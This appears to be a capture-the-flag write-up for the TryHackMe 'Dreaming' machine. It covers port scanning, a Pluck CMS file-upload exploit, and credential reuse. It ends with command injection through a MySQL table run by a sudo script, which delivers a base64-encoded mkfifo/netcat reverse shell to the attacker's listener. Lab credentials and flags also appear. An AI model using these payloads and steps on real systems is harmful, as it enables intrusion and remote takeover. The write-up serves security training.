While the king of dreams was imprisoned, his home fell into ruins.
Can you help Sandman restore his kingdom?

## Recon
```
└─# rustscan --ulimit=5000 --range=1-65535 -a 10.10.13.4 -- -sV
[~] Automatically increasing ulimit value to 5000.
Open 10.10.13.4:22
Open 10.10.13.4:80

┌──(root㉿1337)-[/home/…/Desktop/Learning/CTFs-Journey/CTFs_Machines]
└─# nmap -sC -A -Pn -p80 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-26 00:33 GMT
Nmap scan report for 10.10.13.4
Host is up (0.65s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
```


## Fuzz
```
└─# ffuf -u "http://10.10.13.4/FUZZ" -w /usr/share/wordlists/dirb/common.txt            
 :: Method           : GET
 :: URL              : http://10.10.13.4/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 905ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 886ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 875ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2643ms]
app                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 702ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 822ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 741ms]
```
In the app, found
http://10.10.13.4/app/ [DIR]	pluck 4.7.13
Now i googled it and found some exploit
```
└─# searchsploit pluck 4.7.13                                                  
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                               | php/webapps/49909.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
I go on admin and i tried `password` and i am just logged in on the admin panel

**Upload shell**
I switch on : http://10.10.13.4/app/pluck-4.7.13/admin.php?action=files
by reading this : https://loopspell.medium.com/cve-2020-29607-remote-code-execution-via-file-upload-restriction-bypass-f5cff38d94c6

When i upload a php file it's not working so now i upload the P0wny shell using .phar
http://10.10.13.4/app/pluck-4.7.13/files/shell2.phar
Got shell
```
└─$ sudo rlwrap nc -lvnp 1337
[sudo] password for bloman: 
listening on [any] 1337 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.13.4] 55870
sh: 0: can't access tty; job control turned off
$ 

```
## Lateral Escalation
In `pass.php` i got 
```
cat pass.php
<?php
$ww = 'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86';
```

```
└─# hashid b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
Analyzing 'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86'
[+] SHA-512 
[+] Whirlpool 
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 
[+] Skein-512 
[+] Skein-1024(512) 
```
Cracked : `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86:password`
```
www-data@dreaming:/var/www/html/app/pluck-4.7.13/data/settings$ find / -type f -perm /4000 -ls 2>/dev/null
   262815     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   274370     40 -rwsr-xr-x   1 root     root        39144 May 30 15:42 /usr/bin/umount
   263034     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
   263338    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
```
I can run root it using pkexec.
Not working. i run now linenum
```
[-] Kernel information (continued):
Linux version 5.4.0-155-generic (buildd@lcy02-amd64-103) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023


[-] Listening TCP:
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
LISTEN  0        70             127.0.0.1:33060          0.0.0.0:*              
LISTEN  0        151            127.0.0.1:3306           0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128                 [::]:22                [::]:*              
LISTEN  0        511                    *:80                   *:* 
```
Now i will try to exploit the sudo version
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git 
Not work


## 2nd approch
the /opt is also important in CTFs.
found 2 files

```
www-data@dreaming:/opt$ ls
ls
getDreams.py  test.py
www-data@dreaming:/opt$ 
www-data@dreaming:/opt$ cat test.py
cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```
I just found lucien password, so i will connect on ssh `HeyLucien#@1999!`
```
lucien@dreaming:~$ ls
lucien_flag.txt
lucien@dreaming:~$ cat *
THM{TH3_L1BR4R14N}
lucien@dreaming:~$ 

```
I will try to connect on the mysql using these creds
```
lucien@dreaming:/home$ mysql -u lucien -h localhost -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'lucien'@'localhost' (using password: YES)
lucien@dreaming:/home$ 
```
Not work but
```
lucien@dreaming:/home$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```
on the `/opt` it was the same file, so i will execute the script as the user death using 
```
sudo -u death python3 /home/death/getDreams.py
lucien@dreaming:/opt$ sudo -u death python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

lucien@dreaming:/opt$ 
```
Now i look on my user bash history
```
ls
mysql -u lucien -plucien42DBPASSWORD
ls -la
cat .bash_history 
cat .mysql_history 
clear
ls


```
found this password
**Connect on the DB**
```
lucien@dreaming:~$ mysql -u lucien -h localhost -plucien42DBPASSWORD
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use mysql


```

## Escalation using mysql
I will use the library table to add my payload
```
Database changed
mysql> show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.01 sec)

mysql> 
mysql> insert into dreams (dreamer,dream) values ("payload",";id");

```
Now when i reexecute
```
lucien@dreaming:~$ sudo -u death python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

payload +
uid=1001(death) gid=1001(death) groups=1001(death)
```
Now i will use `revshells.com` to get a shell. encode in base64

```
insert into dreams (dreamer,dream) values ("payload",";echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjQuMjYuMjE2IDEzMzggPi90bXAvZg==|base64 -d|bash");

└─$ sudo rlwrap nc -lvnp 1338
[sudo] password for bloman: 
listening on [any] 1338 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.13.4] 38340
$ id
uid=1001(death) gid=1001(death) groups=1001(death)
$ 
```
Got my shell as death
```
THM{1M_TH3R3_4_TH3M}

```